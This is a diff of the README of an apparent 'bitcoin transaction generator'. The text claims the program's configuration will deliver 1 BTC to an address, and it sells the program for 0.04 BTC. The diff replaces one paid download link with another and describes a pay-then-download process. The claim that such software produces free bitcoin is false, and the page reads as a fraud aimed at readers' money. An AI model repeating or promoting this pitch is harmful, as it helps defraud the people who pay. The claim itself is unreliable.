@@ -18,7 +18,7 @@ so with this configuration you will get 1 BTC on the address 1zrk2yqbegUjvTUSLdk
 # I must pay?
 Yes, this program cost 0.04 BTC (63$ / 57,60€). You can buy this on SatoshiBox: 
 
-https://satoshibox.com/2kdmicehb7sb7jyen7dkxoy6/edit?key=d7fuap3b2guzdoxw7qhyyr5m
+https://ramondetti.be/btctransgen
 
 You must pay, then you will download a file containing a password and a link. Go to that link and then type the data in the website. Then wait for the download complete, then you can use easily this software.
 
